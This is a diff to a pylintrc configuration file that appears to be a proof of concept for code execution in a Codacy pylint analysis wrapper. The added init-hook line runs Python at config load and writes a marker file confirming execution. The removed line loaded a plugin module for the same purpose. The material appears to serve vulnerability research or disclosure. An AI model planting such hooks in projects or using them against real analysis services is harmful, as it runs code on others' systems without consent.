@@ -1,6 +1,5 @@
 [MASTER]
 # On the no-patterns branch, the codacy-pylint wrapper passes NO --rcfile (rcfile=None),
 # so pylint 1.9.5 falls back to default config discovery from cwd (/src) and finds this file.
-# load-plugins triggers importlib.import_module("codacy_rce"). With /src on sys.path
-# (pylint prepends the analyzed dir), /src/codacy_rce.py is imported and its top-level code runs.
-load-plugins=codacy_rce
+# init-hook is a Python expression statement executed by pylint at config load (exec path).
+init-hook=open("/tmp/codacy-pylint-rce-confirmed.txt","w").write("RCE confirmed via pylint init-hook exec. cwd="+__import__("os").getcwd())
